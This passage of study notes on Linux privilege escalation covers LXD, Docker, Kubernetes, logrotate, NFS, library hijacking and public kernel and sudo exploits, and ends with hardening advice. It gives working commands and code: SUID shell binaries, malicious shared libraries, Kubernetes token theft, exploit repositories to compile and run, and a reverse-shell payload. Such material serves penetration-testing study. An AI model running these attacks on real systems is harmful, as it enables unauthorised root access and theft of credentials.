  - Lower resource consumption
  - Portability across clouds
  - Easy management
- **Note:** Popularized by Docker, which advanced container technology.

#### **3. Linux Daemon (LXD)**

##### **3.1. LXD**
- **Description:** A system container that provides a full OS environment, unlike application containers.
- **Privilege Escalation:** To exploit LXD for privilege escalation, one must be in the `lxc` or `lxd` group.

#### **4. Exploiting LXC/LXD**

##### **4.1. Check Group Membership**
- **Purpose:** Verify if the user is in the `lxc` or `lxd` group.
- **Command Example:** `id`

##### **4.2. Import and Use Container**
- **Purpose:** Import a container template, configure it with elevated privileges, and start it.
- **Commands:**
  ```bash
  lxc image import ubuntu-template.tar.xz --alias ubuntutemp
  lxc init ubuntutemp privesc -c security.privileged=true
  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc /bin/bash
  ```

##### **4.3. Access Host System Resources**
- **Purpose:** Access and inspect host system resources from within the container.
- **Command Example:** `ls -l /mnt/root`
### Docker

##### **1.1. What is Docker?**
- **Description:** Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.

##### **1.2. Docker Containers**
- **Description:** Docker containers are lightweight standalone executable software packages that contain everything needed to run an application code runtime.

#### **2. Docker Architecture**

##### **2.1. Docker Daemon**
- **Description:** The Docker Daemon, also known as the Docker server, is responsible for running, managing, and interacting with Docker containers.
- **Key Responsibilities:**
  - Running Docker containers
  - Managing Docker containers on the host system
  - Handling Docker image management
  - Monitoring and logging container activities

##### **2.2. Docker Client**
- **Description:** The Docker Client is the interface for issuing commands and interacting with the Docker ecosystem.
- **Functions:**
  - Creating, starting, stopping, managing, and removing containers
  - Searching and downloading Docker images
  - Building custom images using Dockerfiles
  - Pushing images to remote repositories

##### **2.3. Docker Compose**
- **Description:** A tool that simplifies the orchestration of multiple Docker containers as a single application.
- **Functions:**
  - Defining multi-container architecture using a declarative YAML file
  - Specifying services, dependencies, and configurations

##### **2.4. Docker Desktop**
- **Description:** A GUI for MacOS, Windows, and Linux that simplifies container management.
- **Functions:**
  - Monitoring container status
  - Inspecting logs
  - Managing resources
  - Supporting Kubernetes

#### **3. Docker Images and Containers**

##### **3.1. Docker Images**
- **Description:** Docker images are blueprints or templates for creating containers. They include code, dependencies, libraries, and configurations.

##### **3.2. Docker Containers**
- **Description:** Docker containers are instances of Docker images, providing isolated and executable environments for running applications.

#### **4. Docker Privilege Escalation**

##### **4.1. Docker Shared Directories**
- **Description:** Shared directories (volume mounts) bridge the host system and container's filesystem.
- **Example:**
  - Accessing host system files from within a container

##### **4.2. Docker Sockets**
- **Description:** Docker sockets are special files allowing communication between Docker clients and the Docker daemon.
- **Example:**
  - Accessing and interacting with Docker socket for privilege escalation

##### **4.3. Docker Group**
- **Description:** Being in the Docker group allows users to control Docker, potentially leading to privilege escalation.
- **Example:**
  - Checking Docker group membership

##### **4.4. Writable Docker Socket**
- **Description:** Writable Docker sockets can be used for privilege escalation if not properly secured.
- **Example:**
  - Running privileged Docker containers using writable sockets

#### **5. Detailed Commands for Managing Docker**

##### **5.1. Viewing Docker Images**
- **Purpose:** List available Docker images.
- **Command Example:** `docker image ls`

##### **5.2. Running Docker Containers**
- **Purpose:** Run a Docker container with specific settings.
- **Command Example:** `docker run --rm -d --privileged -v /:/hostsystem main_app`

##### **5.3. Executing Commands in Docker Containers**
- **Purpose:** Execute commands within a running Docker container.
- **Command Example:** `docker exec -it <container_id> /bin/bash`

##### **5.4. Accessing Docker Socket**
- **Purpose:** Use Docker socket to manage and interact with containers.
- **Command Example:** `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash`
### Kubernetes
##### **1.1. Introduction**
- **Description:** Kubernetes, or K8s, is a revolutionary container orchestration platform developed by Google and donated to the Cloud Native Computing Foundation. It facilitates the deployment, scaling, and management of application containers in a more efficient and streamlined manner.
- **Features:** Application container orchestration, scalable deployments, compatibility with various environments.

#### **2. Kubernetes Architecture**

##### **2.1. Master Node (Control Plane)**
- **Purpose:** Manages and coordinates activities within the Kubernetes cluster.
- **Components:**
  - **etcd:** TCP Ports 2379, 2380
  - **API server:** TCP Port 6443
  - **Scheduler:** TCP Port 10251
  - **Controller Manager:** TCP Port 10252
  - **Kubelet API:** TCP Port 10250
  - **Read-Only Kubelet API:** TCP Port 10255

##### **2.2. Worker Nodes (Minions)**
- **Purpose:** Execute containerized applications as directed by the Control Plane.
- **Functions:** Running applications, receiving instructions from the Control Plane, ensuring desired state.

#### **3. Kubernetes Concepts**

##### **3.1. Pods**
- **Description:** The smallest deployable units in Kubernetes, which can contain one or more containers.
- **Functions:** Each pod has its own IP, hostname, and other details. It facilitates load balancing, service discovery, storage orchestration, and self-healing.

##### **3.2. Key Differences: Kubernetes vs Docker**
- **Docker:**
  - **Primary:** Platform for containerizing applications
  - **Scaling:** Manual scaling with Docker swarm
  - **Networking:** Single network
  - **Storage:** Volumes
- **Kubernetes:**
  - **Primary:** Orchestration tool for managing containers
  - **Scaling:** Automatic scaling
  - **Networking:** Complex network with policies
  - **Storage:** Wide range of storage options

#### **4. Kubernetes Security Measures**

##### **4.1. Security Domains**
- **Cluster Infrastructure Security**
- **Cluster Configuration Security**
- **Application Security**
- **Data Security**

##### **4.2. Authentication**
- **Methods:** Client certificates, bearer tokens, authenticating proxy, HTTP basic auth
- **Role-Based Access Control (RBAC):** Assigning roles with permissions to users or processes

##### **4.3. Kubelet API Access**
- **Anonymous Access:** Default allows anonymous access, which can be problematic for security.

#### **5. Kubernetes API**

##### **5.1. API Operations**
- **GET:** Retrieves information about a resource or a list of resources
- **POST:** Creates a new resource
- **PUT:** Updates an existing resource
- **PATCH:** Applies partial updates to a resource
- **DELETE:** Removes a resource

##### **5.2. API Resources**
- **Examples:** Pods, Services, Deployments

#### **6. Practical Commands and Examples**

##### **6.1. Accessing API Server**
- **Command Example:** `curl https://10.129.10.11:6443 -k`
  - **Output:** "Forbidden: User 'system:anonymous' cannot get path '/'"

##### **6.2. Extracting Pods Using Kubelet API**
- **Command Example:** `curl https://10.129.10.11:10250/pods -k | jq .`

##### **6.3. Using kubeletctl for Interaction**
- **Extracting Pods:**
  - **Command Example:** `kubeletctl -i --server 10.129.10.11 pods`
- **Available Commands:**
  - **Command Example:** `kubeletctl -i --server 10.129.10.11 scan rce`
- **Executing Commands:**
  - **Command Example:** `kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx`

##### **6.4. Privilege Escalation**
- **Extracting Tokens:**
  - **Command Example:** `kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token`
- **Extracting Certificates:**
  - **Command Example:** `kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt`
- **Listing Privileges:**
  - **Command Example:** `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list`

##### **6.5. Creating a New Pod**
- **Pod YAML File Example:**
  ```yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: privesc
    namespace: default
  spec:
    containers:
    - name: privesc
      image: nginx:1.14.2
      volumeMounts:
      - mountPath: /root
        name: mount-root-into-mnt
    volumes:
    - name: mount-root-into-mnt
      hostPath:
         path: /
    automountServiceAccountToken: true
    hostNetwork: true
  ```
- **Creating Pod Command:**
  - **Command Example:** `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 apply -f privesc.yaml`
  - **Checking Pod Status:** `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 get pods`


### Logrotate

##### **1.1. Purpose**
- Manage and archive large log files to prevent disk overflow and facilitate efficient log management.

##### **1.2. Features**
- Specify log file size and age.
- Define actions for reaching size or age limits.

#### **2. Commands and Usage**

##### **2.1. Basic Commands**
- **View Manual:** `man logrotate`
- **Help Option:** `logrotate --help`

##### **2.2. Command Options**
- **-d, --debug:** Don't do anything, just test and print debug messages.
- **-f, --force:** Force file rotation.
- **-m, --mail=command:** Command to send mail (instead of '/usr/bin/mail').
- **-s, --state=statefile:** Path of state file.
- **--skip-state-lock:** Do not lock the state file.
- **-v, --verbose:** Display messages during rotation.
- **-l, --log=logfile:** Log file or 'syslog' to log to syslog.
- **--version:** Display version information.
- **-?, --help:** Show this help message.
- **--usage:** Display brief usage message.

#### **3. Configuration**

##### **3.1. Global Configuration**
- **File:** `/etc/logrotate.conf`
- **Settings:**
  - **Weekly Rotation:** `weekly`
  - **Owner Group:** `su root adm`
  - **Backlogs:** `rotate 4`
  - **Create New Log Files:** `create`
  - **Date Suffix:** `#dateext`
  - **Compression:** `#compress`
  - **Include Directory:** `include /etc/logrotate.d`

##### **3.2. State File**
- **Path:** `/var/lib/logrotate.status`
- **Example:** 
  - `/var/log/samba/log.smbd" 2022-8-3`
  - `/var/log/mysql/mysql.log" 2022-8-3`

##### **3.3. Configuration Files in /etc/logrotate.d/**
- **List of Files:**
  - `alternatives`
  - `apport`
  - `apt`
  - `bootlog`
  - `btmp`
  - `dpkg`
  - `mon`
  - `rsyslog`
  - `ubuntu-advantage-tools`
  - `ufw`
  - `unattended-upgrades`
  - `wtmp`

##### **3.4. Example Configuration File**
- **File:** `/etc/logrotate.d/dpkg`
- **Settings:**
  - **Rotation Frequency:** `monthly`
  - **Number of Rotations:** `rotate 12`
  - **Compression:** `compress`
  - **Delay Compression:** `delaycompress`
  - **Missing Log Files:** `missingok`
  - **Notify Empty Files:** `notifempty`
  - **File Creation:** `create 644 root root`

#### **4. Exploitation**

##### **4.1. Requirements**
- **Permissions:** Write permissions on log files.
- **Privileges:** Logrotate must run as a privileged user or root.
- **Vulnerable Versions:**
  - 3.8.6
  - 3.11.0
  - 3.15.0
  - 3.18.0

##### **4.2. Exploit Preparation**
- **Exploit Tool:** `logrotten`
  - **Clone Repository:**
    - `git clone https://github.com/whotwagner/logrotten.git`
    - `cd logrotten`
    - `gcc logrotten.c -o logrotten`
  - **Payload Creation:**
    - `echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload`
  - **Determine Logrotate Option:**
    - `grep "create\|compress" /etc/logrotate.conf | grep -v "#"`
  - **Start Listener:**
    - `nc -nlvp 9001`
  - **Run Exploit:**
    - `./logrotten -p ./payload /tmp/tmp.log`
  - **Verification:**
    - `id` (Check if the reverse shell is successful)


### Miscellaneous Techniques

##### **1.1. Passive Traffic Capture**
- **Purpose:** Capture network traffic to identify sensitive information and credentials.
- **Details:** Tools like net-creds and PCredz can be used to examine traffic, potentially revealing credentials in cleartext or hashes for offline attacks.
  
##### **1.2. Weak NFS Privileges**
- **Purpose:** Exploit misconfigurations in NFS for unauthorized access.
- **Commands and Details:**
  - **List NFS Shares:** `showmount -e <NFS_Server_IP>`
  - **NFS Options:**
    - **root_squash:** Changes root user to nfsnobody.
    - **no_root_squash:** Allows remote users to access as root.
  - **Configuration File:** `/etc/exports`

  - **Example Exploit:**
    - **Create SETUID Binary:**
      ```c
      #include <stdio.h>
      #include <sys/types.h>
      #include <unistd.h>
      #include <stdlib.h>
      
      int main(void)
      {
        setuid(0); setgid(0); system("/bin/bash");
      }
      ```
    - **Compile and Copy Binary:**
      ```bash
      gcc shell.c -o shell
      sudo mount -t nfs 10.129.2.12:/tmp /mnt
      cp shell /mnt
      chmod u+s /mnt/shell
      ```
    - **Execute Binary:**
      ```bash
      ./shell
      id
      ```

##### **1.3. Hijacking Tmux Sessions**
- **Purpose:** Gain unauthorized access through hijacked tmux sessions.
- **Commands and Details:**
  - **Create and Set Permissions:**
    ```bash
    tmux -S /shareds new -s debugsess
    chown root:devs /shareds
    ```
  - **Check Running Tmux Processes:**
    ```bash
    ps aux | grep tmux
    ```
  - **Confirm Permissions:**
    ```bash
    ls -la /shareds
    ```
  - **Review Group Membership:**
    ```bash
    id
    ```
  - **Attach to Tmux Session:**
    ```bash
    tmux -S /shareds
    id
    ```
## Linux Internals-based Privilege Escalation
### Kernel Exploits

##### **1.1. Overview**
- **Purpose:** Leverage vulnerabilities in the Linux kernel to execute code with root privileges. Kernel exploits can be used to gain unauthorized access or escalate privileges on a vulnerable system.
- **Considerations:** Kernel exploits can cause system instability, so use caution when running these on production systems. Keeping track of legacy systems and managing updates is essential to mitigate risks.

##### **1.2. Identification**
- **Command Example:** `uname -a`
  - **Purpose:** Identify the kernel version and distribution to search for relevant exploits.
- **Example Output:**
  - `Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux`
- **Additional Information:** Use the output to search for kernel-specific exploits online.

##### **1.3. Exploit Compilation and Execution**
- **Download and Compile:**
  - **Command Example:** `gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit`
  - **Purpose:** Compile the exploit code and set executable permissions.
- **Run Exploit:**
  - **Command Example:** `./kernel_exploit`
  - **Purpose:** Execute the compiled exploit to attempt privilege escalation.
  - **Example Output:**
    - `task_struct = ffff8800b71d7000`
    - `uidptr = ffff8800b95ce544`
    - `spawning root shell`
- **Confirm Access:**
  - **Command Example:** `whoami`
  - **Purpose:** Verify if root access was successfully obtained.
  - **Example Output:**
    - `root`

**Note:** Even after updates, systems may remain vulnerable. Always use the most current exploit relevant to the system’s kernel version.
### Shared Libraries

##### **2.1. Overview**
- **Purpose:** Utilize shared object libraries to manage and execute common code across multiple programs. Shared libraries can be dynamically linked and modified, providing potential for privilege escalation.

##### **2.2. Types of Libraries**
- **Static Libraries:** Denoted by the `.a` file extension. They are compiled into the program and cannot be altered.
- **Dynamic Libraries:** Denoted by the `.so` file extension. They can be modified to control program execution.

##### **2.3. Library Locations and Loading**
- **Dynamic Library Specification:**
  - **Flags:** `-rpath` or `-rpath-link` during compilation.
  - **Environment Variables:** `LD_RUN_PATH` or `LD_LIBRARY_PATH`.
  - **Default Directories:** `/lib` or `/usr/lib`.
  - **Configuration File:** `/etc/ld.so.conf`.

##### **2.4. LD_PRELOAD Environment Variable**
- **Purpose:** Load a library before executing a binary, giving preference to its functions over default ones.
- **Command Example:** `ldd /bin/ls`
  - **Purpose:** List shared objects required by a binary.
  - **Example Output:**
    - `linux-vdso.so.1 =>  (0x00007fff03bc7000)`
    - `libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)`
    - `libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)`
    - `libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)`
    - `libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)`
    - `/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)`
    - `libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)`

##### **2.5. LD_PRELOAD Privilege Escalation**
- **Check Sudo Privileges:**
  - **Command Example:** `sudo -l`
  - **Purpose:** List commands a user can run with sudo privileges.
  - **Example Output:**
    - User `daniel.carter` can run `/usr/sbin/apache2 restart` as root with `NOPASSWD`.

- **Create Malicious Library:**
  - **Code Example (C):**
    ```c
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>

    void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
    }
    ```
  - **Compile Command:** `gcc -fPIC -shared -o root.so root.c -nostartfiles`

- **Execute Privilege Escalation:**
  - **Command Example:** `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`
  - **Confirm Access:**
    - **Command Example:** `id`
    - **Example Output:**
      - `uid=0(root) gid=0(root) groups=0(root)`
### Shared Object Hijacking

##### **3.1. Overview**
- **Purpose:** Exploit custom libraries associated with binaries to gain elevated privileges.

##### **3.2. Identify Vulnerable Binaries**
- **Example Binary:** `payroll`
  - **Permissions:** `-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll`
  - **Command Example:** `ls -la payroll`
    - **Output:**
      - `-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll`

##### **3.3. Inspect Shared Libraries**
- **List Dependencies:** Use `ldd` to view shared libraries required by the binary.
  - **Command Example:** `ldd payroll`
    - **Output:**
      - `linux-vdso.so.1 =>  (0x00007ffcb3133000)`
      - `libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)`
      - `libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)`
      - `/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)`

##### **3.4. Check RUNPATH Configuration**
- **Inspect RUNPATH:** Use `readelf` to see where libraries are loaded from.
  - **Command Example:** `readelf -d payroll | grep PATH`
    - **Output:**
      - `0x000000000000001d (RUNPATH)            Library runpath: [/development]`

- **Directory Inspection:** The `/development` folder is writable by all users.
  - **Command Example:** `ls -la /development/`
    - **Output:**
      - `drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./`
      - `drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../`

##### **3.5. Exploit Vulnerability**
- **Replace Library:** Copy an existing library to `/development` and modify it to include a function used by the binary.
  - **Command Example:** `cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so`
  - **Command Example:** `./payroll`
    - **Output:**
      - `./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery`

- **Create Malicious Library:**
  - **Code Example (C):**
    ```c
    #include<stdio.h>
    #include<stdlib.h>
    #include<unistd.h>

    void dbquery() {
        printf("Malicious library loaded\n");
        setuid(0);
        system("/bin/sh -p");
    }
    ```
  - **Compile Command:** `gcc src.c -fPIC -shared -o /development/libshared.so`

- **Execute the Exploit:**
  - **Command Example:** `./payroll`
    - **Output:**
      - `***************Inlane Freight Employee Database***************`
      - `Malicious library loaded`
      - `# id`
        - `uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)`
### Python Library Hijacking
Here's a detailed walkthrough of the **Python Library Hijacking** technique:

### **Overview**
Python Library Hijacking exploits how Python imports and uses libraries. By leveraging misconfigurations or vulnerabilities in the library path or permissions, an attacker can execute malicious code with the privileges of the Python script.

### **Methods of Hijacking**

1. **Wrong Write Permissions**
   - **Scenario**: A Python script with SUID/SGID permissions imports a library with misconfigured write permissions.
   - **Example**: The `mem_status.py` script is a SUID Python script:
     ```python
     #!/usr/bin/env python3
     import psutil

     available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
     print(f"Available memory: {round(available_memory, 2)}%")
     ```
   - **Steps**:
     1. Identify the imported module and its permissions:
        ```bash
        grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
        ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
        ```
     2. Hijack by modifying the module if writable. Insert malicious code:
        ```python
        def virtual_memory():
            import os
            os.system('id')
        ```
     3. Run the script to verify:
        ```bash
        sudo /usr/bin/python3 ./mem_status.py
        ```

2. **Library Path**
   - **Scenario**: A module is installed in a lower-priority path that can be overwritten by a user.
   - **Example**: The `psutil` module is installed in `/usr/local/lib/python3.8/dist-packages`, but a writable path like `/usr/lib/python3.8` takes precedence.
   - **Steps**:
     1. Create a malicious module in the higher-priority directory:
        ```python
        # /usr/lib/python3.8/psutil.py
        import os
        def virtual_memory():
            os.system('id')
        ```
     2. Run the script to exploit the path hijacking:
        ```bash
        sudo /usr/bin/python3 ./mem_status.py
        ```

3. **PYTHONPATH Environment Variable**
   - **Scenario**: Manipulate the `PYTHONPATH` environment variable to redirect Python to a user-controlled directory containing malicious modules.
   - **Example**: If the `PYTHONPATH` is set to `/tmp` where a malicious `psutil.py` is placed.
   - **Steps**:
     1. Create a malicious `psutil.py` in `/tmp`:
        ```python
        # /tmp/psutil.py
        import os
        def virtual_memory():
            os.system('id')
        ```
     2. Run the script with `PYTHONPATH` set to `/tmp`:
        ```bash
        sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
        ```

### **Summary**
Python Library Hijacking takes advantage of how Python manages libraries, relying on misconfigured permissions, path prioritization, or environment variables. Properly managing library permissions and paths, and avoiding unsafe configurations, can mitigate these vulnerabilities.
## Recent 0-Days
### Sudo
This content is a detailed explanation of exploiting vulnerabilities related to `sudo`, a commonly used tool in UNIX-like systems. It covers two main vulnerabilities:

1. **CVE-2021-3156**:
   - **Description**: A heap-based buffer overflow in `sudo` that affects several versions, including 1.8.31 on Ubuntu 20.04.
   - **Exploit**: Using a Proof-Of-Concept (PoC) script from GitHub to gain root access. Steps include cloning the repo, compiling the exploit, and running it with appropriate arguments for the target OS.
   - **Commands**:
     ```bash
     sudo -V | head -n1
     git clone https://github.com/blasty/CVE-2021-3156.git
     cd CVE-2021-3156
     make
     ./sudo-hax-me-a-sandwich
     ```

2. **CVE-2019-14287**:
   - **Description**: A policy bypass vulnerability that affects `sudo` versions below 1.8.28. It allows privilege escalation if a user is allowed to run a specific command.
   - **Exploit**: If a user can run `/usr/bin/id` with `sudo`, entering a user ID of `-1` can grant root privileges.
   - **Commands**:
     ```bash
     sudo -l
     cat /etc/passwd | grep cry0l1t3
     sudo -u#-1 id
     ```

Both vulnerabilities demonstrate how `sudo` can be exploited to escalate privileges on systems with vulnerable configurations.
### Polkit
- **Purpose**: `polkit` is an authorization service used to manage permissions for actions performed by user software and system components. It determines whether an action is allowed based on configured policies.

- **Configuration Files**:
  - **Actions/Policies**: `/usr/share/polkit-1/actions`
  - **Rules**: `/usr/share/polkit-1/rules.d`
  - **Local Authority Rules**: `/etc/polkit-1/localauthority/50-local.d/*.pkla`

- **Tools**:
  - **`pkexec`**: Executes commands with the privileges of another user or root.
  - **`pkaction`**: Displays available actions.
  - **`pkcheck`**: Checks if a process is authorized for a specific action.

### **Exploitation of CVE-2021-4034 (Pwnkit)**

- **Description**: CVE-2021-4034 is a memory corruption vulnerability in `pkexec` that allows privilege escalation. It was discovered in 2021 but existed undetected for over a decade.

- **Exploit Steps**:
  1. **Clone the PoC Repository**:
     ```bash
     git clone https://github.com/arthepsy/CVE-2021-4034.git
     cd CVE-2021-4034
     ```

  2. **Compile the PoC**:
     ```bash
     gcc cve-2021-4034-poc.c -o poc
     ```

  3. **Execute the Exploit**:
     ```bash
     ./poc
     ```

  4. **Verify Root Access**:
     ```bash
     id
     ```
     Output should show `uid=0(root)` indicating root privileges.

This vulnerability demonstrates how outdated or unpatched components can be exploited to gain unauthorized access to system privileges.
### Dirty Pipe

- **Description**: A vulnerability in the Linux kernel (versions 5.8 to 5.17) allows unauthorized writing to root user files. Similar to the Dirty Cow vulnerability from 2016, it enables a user with read access to files to write arbitrary data to them.

- **Affected Systems**: All Linux kernels from version 5.8 to 5.17, including Android devices.

### **Exploitation Steps**

1. **Clone the PoC Repository**:
   ```bash
   git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
   cd CVE-2022-0847-DirtyPipe-Exploits
   ```

2. **Compile the Code**:
   ```bash
   bash compile.sh
   ```

3. **Verify Kernel Version**:
   ```bash
   uname -r
   ```

4. **Exploit Versions**:
   - **Exploit-1**: Modifies `/etc/passwd` to set a root password, allowing root access.
     ```bash
     ./exploit-1
     ```
     This will back up `/etc/passwd`, set the root password to "piped", and restore the file. After running the exploit, a root shell will be available.
     
   - **Exploit-2**: Hijacks SUID binaries to gain root privileges.
     - Find SUID binaries:
       ```bash
       find / -perm -4000 2>/dev/null
       ```
     - Use the exploit on a chosen SUID binary:
       ```bash
       ./exploit-2 /usr/bin/sudo
       ```
     This will hijack the SUID binary, drop a SUID shell, and restore the binary. After running the exploit, a root shell will be available.

### **Post-Exploitation**

- **Check Root Privileges**:
  ```bash
  id
  ```

- **Cleanup**: Remember to clean up any temporary files created by the exploits, such as `/tmp/sh`.

This vulnerability illustrates how even a small kernel flaw can be leveraged to gain full control over a system, highlighting the importance of keeping systems updated and patched.
### Netfilter

Netfilter is a Linux kernel module providing packet filtering, network address translation (NAT), and other network traffic control functions. It includes tools like iptables and arptables for IPv4 and IPv6 protocol stacks.

### **Key Functions**
- **Packet Defragmentation**
- **Connection Tracking**
- **Network Address Translation (NAT)**

### **Vulnerabilities and Exploits**

#### **CVE-2021-22555**

- **Affected Kernels**: 2.6 - 5.11
- **Description**: This vulnerability involves a memory corruption issue that can be exploited for privilege escalation.
- **Exploitation Steps**:
  ```bash
  wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
  gcc -m32 -static exploit.c -o exploit
  ./exploit
  ```
  The exploit initializes a namespace sandbox, corrupts memory, and eventually provides root access.

#### **CVE-2022-25636**

- **Affected Kernels**: 5.4 through 5.6.10
- **Description**: This vulnerability involves a heap out-of-bounds write that can grant root privileges to local users.
- **Exploitation Steps**:
  ```bash
  git clone https://github.com/Bonfee/CVE-2022-25636.git
  cd CVE-2022-25636
  make
  ./exploit
  ```
  The exploit involves leaking and manipulating kernel data structures to gain root access.

#### **CVE-2023-32233**

- **Affected Kernels**: Up to version 6.3.1
- **Description**: This vulnerability involves a Use-After-Free condition with anonymous sets in nf_tables, leading to potential root privilege escalation.
- **Exploitation Steps**:
  ```bash
  git clone https://github.com/Liuk3r/CVE-2023-32233
  cd CVE-2023-32233
  gcc -Wall -o exploit exploit.c -lmnl -lnftnl
  ./exploit
  ```
  The exploit manipulates cleared-out anonymous sets to interact with kernel memory and achieve root access.

### **Notes**
- **Kernel Versions**: Ensure compatibility with the target kernel before attempting exploitation.
- **Stability**: These exploits can be unstable and may corrupt the kernel, potentially requiring a system reboot.

These vulnerabilities demonstrate the critical nature of timely patching and updates in maintaining system security.
## Linux Hardening
Proper Linux hardening can significantly mitigate the risk of privilege escalation. Here are key steps to enhance the security of Linux systems:

#### **Updates and Patching**
- **Importance**: Regular updates and patches address known vulnerabilities, including those that can be exploited for privilege escalation.
- **Tools**:
  - **Ubuntu**: Use `unattended-upgrades` for automatic updates.
  - **Red Hat**: Use `yum-cron` for similar functionality.

#### **Configuration Management**
- **Key Measures**:
  - **Audit Writable Files**: Identify and secure files and directories that are writable by non-privileged users.
  - **Absolute Paths in Cron Jobs and Sudo**: Ensure cron jobs and sudo commands use absolute paths.
  - **Secure Storage**: Avoid storing credentials in plain text in world-readable files.
  - **Cleanup**: Regularly clean home directories and bash history.
  - **Library Modification**: Prevent low-privileged users from modifying custom libraries.
  - **Remove Unnecessary Packages**: Reduce the attack surface by removing unused packages and services.
  - **SELinux**: Consider implementing SELinux for additional access control.

#### **User Management**
- **Best Practices**:
  - **Limit User Accounts**: Minimize the number of user and admin accounts.
  - **Log Monitoring**: Ensure all logon attempts are logged and monitored.
  - **Strong Password Policy**: Enforce strong passwords and periodic password rotation. Use `/etc/security/opasswd` with the PAM module to prevent password reuse.
  - **Least Privilege**: Limit sudo rights and group memberships to only those needed for the user's tasks.

#### **Configuration Management Tools**
- **Automation Tools**:
  - **Puppet, SaltStack**: For automated configuration management and hardening.
  - **Zabbix, Nagios**: For monitoring and automated remediation. Zabbix includes checksum verification for sensitive binaries.

#### **Audit**
- **Regular Checks**: Perform periodic security and configuration audits.
- **Standards**: Follow security baselines like DISA STIGs, ISO27001, PCI-DSS, and HIPAA. Customize based on the organization’s specific needs.
- **Tools**:
  - **Lynis**: Audits the configuration and provides hardening tips.
  - **Example Usage**:
    ```bash
    git clone https://github.com/CISOfy/lynis
    cd lynis
    ./lynis audit system
    ```

#### **Lynis Example Report**
- **Warnings**:
  - Incorrect cronjob file permissions.
  - Systemd-timesyncd synchronization issues.
- **Suggestions**:
  - Set a password on the GRUB boot loader.
  - Disable core dumps if not needed.
  - Correct errors in the password file using `pwck`.
  - Configure encryption algorithm rounds in `/etc/login.defs`.

### **Conclusion**
- **Privilege Escalation**: Various paths exist, from misconfigurations to public exploits and custom exploit development.
- **Hardening**: Essential for reducing risk. Combine manual testing with automated configuration checks for effective security management.

Effective hardening involves both proactive measures and ongoing vigilance to maintain a secure environment against potential attacks.